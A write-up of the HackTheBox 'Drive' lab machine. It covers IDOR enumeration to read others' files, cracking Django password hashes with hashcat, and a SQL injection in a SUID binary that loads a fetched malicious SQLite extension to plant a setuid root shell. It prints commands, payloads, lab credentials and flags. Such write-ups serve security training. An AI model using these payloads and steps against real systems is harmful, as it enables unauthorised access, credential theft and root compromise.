# HackTheBox Drive

Hard level CTF lab machine of the HackTheBox platform running Linux OS, where we will steal creds using IDOR, use a shardcoded password in the source code, brute force a password from the database, and exploit SQL injection in the SUID binary.

## Service Overview

The machine has an IP address of 10.10.11.235. Let's perform a standard scan with Nmap:

```bash
$ nmap -sV -sC -Pn -oN nmap 10.10.11.235
Nmap scan report for 10.10.11.235
Host is up (0.059s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)
|   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)
|_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://drive.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Service

Open Ports: 22,80 (redirects to http://drive.htb) Filtered Port: 3000

To evaluate a web service, we will need to write vhost to our /etc/hosts:

```bash
$ echo "10.10.11.235 drive.htb" | sudo tee -a /etc/hosts
```

The service is similar to cloud storage. Let's register and log in.

After login, let's try to load our test file with the name test.txt and the content test. We will immediately see this file in show My Files. In my case, the file ID was 116.

We can reserve the file by clicking on the Reserve button. This will trigger a GET endpoint **/116/block**.

The file http://drive.htb/100/getFileDetail/ is also available under http://drive.htb/100/block/

Let's send this endpoint to **Bupr Intruder**, change the id 116 to a swap point. We will go from 0 to 200. After that we go to unReserve Files and see other people's files.

Let's go to **```http://drive.htb/79/block/```** in the browser.

We also find a description of the database backup and a hint about its password. Iteration reveals ssh username and password in a document:

```text
hey team after the great success of the platform we need now to continue the work.
on the new features for ours platform.
I have created a user for martin on the server to make the workflow easier for you please use the password "Xk4@KjyrYv8t194L!".
please make the necessary changes to the code before the end of the month
I will reach you soon with the token to apply your changes on the repo
thanks! 
```


## Gitea SSH-Port Forwarding

The filtered port 3000 can be accessed from the intranet. We're going to throw a port and we're going to find Gitea.

```bash
$ ssh -L 3000:drive.htb:3000 martin@10.10.11.235
```

Let's register any user, log in and check the login of user martin:

```bash
martin@drive.htb
```

Using the password obtained earlier, log in as martin@drive.htb.

```bash
martin@drive.htb
Xk4@KjyrYv8t194L!
```

After that we immediately check the file ```http://localhost:3000/crisDisel/DoodleGrive/src/branch/main/db_backup.sh```, in which we find the backup password.

```bash
H@ckThisP@ssW0rDIfY0uC@n:)
```

Let's unpack all the archives and pull hashes from the databases, including the current database.

```bash
$ 7z a -p'H@ckThisP@ssW0rDIfY0uC@n:)' /var/www/backups/${date_str}_db_backup.sqlite3.7z db.sqlite3
```

```bash
pbkdf2_sha256$390000$ZjZj164ssfwWg7UcR8q4kZ$KKbWkEQCpLzYd82QUBq65aA9j3+IkHI6KK9Ue8nZeFU=
pbkdf2_sha256$390000$npEvp7CFtZzEEVp9lqDJOO$So15//tmwvM9lEtQshaDv+mFMESNQKIKJ8vj/dP4WIo=
pbkdf2_sha256$390000$GRpDkOskh4irD53lwQmfAY$klDWUZ9G6k4KK4VJUdXqlHrSaWlRLOqxEvipIpI5NDM=
pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro=
pbkdf2_sha256$390000$TBrOKpDIumk7FP0m0FosWa$t2wHR09YbXbB0pKzIVIn9Y3jlI3pzH0/jjXK0RDcP6U=
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004
sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a
sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
```

The PBKDF2 hashes failed, but the four SHA1 (124 | Django (SHA-1)) hashes did (belonging to the tomHands user).

```bash
sqlite> .tables
accounts_customuser                   auth_permission
accounts_customuser_groups            django_admin_log
accounts_customuser_user_permissions  django_content_type
accounts_g                            django_migrations
accounts_g_users                      django_session
auth_group                            myApp_file
auth_group_permissions                myApp_file_groups

sqlite> select * from accounts_customuser;
16|pbkdf2_sha256$390000$ZjZj164ssfwWg7UcR8q4kZ$KKbWkEQCpLzYd82QUBq65aA9j3+IkHI6KK9Ue8nZeFU=|2022-12-26 06:21:34.294890|1|admin|||admin@drive.htb|1|1|2022-12-08 14:59:02.802351
21|pbkdf2_sha256$390000$npEvp7CFtZzEEVp9lqDJOO$So15//tmwvM9lEtQshaDv+mFMESNQKIKJ8vj/dP4WIo=|2022-12-24 22:39:42.847497|0|jamesMason|||jamesMason@drive.htb|0|1|2022-12-23 12:33:04.637591
22|pbkdf2_sha256$390000$GRpDkOskh4irD53lwQmfAY$klDWUZ9G6k4KK4VJUdXqlHrSaWlRLOqxEvipIpI5NDM=|2022-12-24 12:55:10.152415|0|martinCruz|||martin@drive.htb|0|1|2022-12-23 12:35:02.230289
23|pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro=|2022-12-26 06:20:23.299662|0|tomHands|||tom@drive.htb|0|1|2022-12-23 12:37:45
24|pbkdf2_sha256$390000$TBrOKpDIumk7FP0m0FosWa$t2wHR09YbXbB0pKzIVIn9Y3jlI3pzH0/jjXK0RDcP6U=|2022-12-24 16:51:53.717055|0|crisDisel|||cris@drive.htb|0|1|2022-12-23 12:39:15.072407


sqlite> select * from accounts_customuser;
23|sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004|2022-12-24 13:17:45|0|tomHands|||tom@drive.htb|0|1|2022-12-23 12:37:45

$ hashcat -m 124 ../../hashes/sha1-hashes.txt /usr/share/wordlists/rockyou.txt.gz
sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john316

sqlite> select * from accounts_customuser;
21|sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a|2022-12-26 05:48:27.497873|0|jamesMason|||jamesMason@drive.htb|0|1|2022-12-23 12:33:04
22|sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f|2022-12-24 12:55:10|0|martinCruz|||martin@drive.htb|0|1|2022-12-23 12:35:02
23|sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141|2022-12-26 06:02:42.401095|0|tomHands|||tom@drive.htb|0|1|2022-12-23 12:37:45
24|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f|2022-12-24 16:51:53|0|crisDisel|||cris@drive.htb|0|1|2022-12-23 12:39:15
30|sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3|2022-12-26 05:43:40.388717|1|admin|||admin@drive.htb|1|1|2022-12-26 05:30:58.003372

$ hashcat -m 124 ../../hashes/sha1-hashes.txt /usr/share/wordlists/rockyou.txt.gz
sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:johniscool

sqlite> select * from accounts_customuser;
21|sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a|2022-12-26 05:48:27.497873|0|jamesMason|||jamesMason@drive.htb|0|1|2022-12-23 12:33:04
22|sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f|2022-12-24 12:55:10|0|martinCruz|||martin@drive.htb|0|1|2022-12-23 12:35:02
23|sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a|2022-12-24 13:17:45|0|tomHands|||tom@drive.htb|0|1|2022-12-23 12:37:45
24|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f|2022-12-24 16:51:53|0|crisDisel|||cris@drive.htb|0|1|2022-12-23 12:39:15
30|sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3|2022-12-26 05:43:40.388717|1|admin|||admin@drive.htb|1|1|2022-12-26 05:30:58.003372

$ hashcat -m 124 ../../hashes/sha1-hashes.txt /usr/share/wordlists/rockyou.txt.gz
sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
```

There is a user tom in /etc/passwd.

Let's start searching through the brute-force passwords for SSH connection and get the shell.

```bash
$ ssh tom@10.10.11.235
johnmayer7
```

## User flag

```bash
tom@drive:~$ cat user.txt
5193104aa0c34071998b711b5ff7eade
```

## Privilege escalation

There is a SUID bit SUID binary from root in the tom user directory.

```bash
tom@drive:~$ ls -la
...
-rwSr-x--- 1 root tom 887240 Sep 13:36 doodleGrive-cli
...
```

Decompile and find the login and password required at login. Letting Ghidra (CodeBrowser) analyzing the code shows a username and password to start the cli.

```bash
s_moriarty_0049743f
                             s_moriarty_0049743f                             XREF[1]:     main:004022d5(*)  
        0049743f 6d 6f 72        ds         "moriarty"
                 69 61 72 
                 74 79 00

                             s_findMeIfY0uC@nMr.Holmz!_00497448              XREF[1]:     main:004022ec(*)  
        00497448 66 69 6e        ds         "findMeIfY0uC@nMr.Holmz!"
                 64 4d 65 
                 49 66 59 
```

On case5 is a SQL-Injection possible.

```bash
    snprintf(local_118,0xfa,
             "/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"%s\";\'"
             ,local_148);
```

Load-extension: ```https://www.sqlite.org/loadext.html``` or download the sqlite-execute-module (https://github.com/mpaolino/sqlite-execute-module) and tweak it:

```c
#include <sqlite3ext.h> /* Do not use <sqlite3.h>! */
SQLITE_EXTENSION_INIT1

#include <stdlib.h>

#ifdef _WIN32
__declspec(dllexport)
#endif

int sqlite3_extension_init(
  sqlite3 *db, 
  char **pzErrMsg, 
  const sqlite3_api_routines *pApi
){
  SQLITE_EXTENSION_INIT2(pApi);

  system("/usr/bin/cp /bin/bash /tmp/b");
  system("/usr/bin/chmod +s /tmp/b");

  return SQLITE_OK;
}
```

Command for generate or to build it, using the make command and put the resulting binary next to the vulnerable CLI application as y.so:

```bash
$ gcc -g -fPIC -shared y.c -o y.so
```

Command for doodleGrive-cli:

```bash
"+load_extension(YourCode.so)--; 

or

"+load_extension(char(46,47,121))--"
```

To load module, we need to bypass sanitization in the activate_user_account function and then in sanitize_string. Let's go into the binary, pass the authentication step, select 5, then type "+load_extension(char(46,47,121))--".

```bash
tom@drive:~$ wget http://10.10.16.48:8081/sqlite-execute-module.so
tom@drive:~$ mv sqlite-execute-module.so y.so
tom@drive:~$ ./doodleGrive-cli
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
moriarty
Enter password for moriarty:
findMeIfY0uC@nMr.Holmz!
Welcome...!

doodleGrive cli beta-2.2:
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option: 5
Enter username to activate account: "+load_extension(char(46,47,121))--"
Activating account for user '"+load_extension(char(46,47,121))--"'...

doodleGrive cli beta-2.2:
1. Show users list and info
2. Show groups list
3. Check server health and status
4. Show server requests log (last 1000 request)
5. activate user account
6. Exit
Select option: 6
exiting...
```

Getting root shell:

```bash
tom@drive:~$ /tmp/b -p
b-5.0# id
uid=1003(tom) gid=1003(tom) euid=0(root) egid=0(root) groups=0(root),1003(tom)
b-5.0# cd /root
b-5.0# ls
root.txt
b-5.0# cat root.txt
9a3c912bd957523d8b485fafde5e723c
```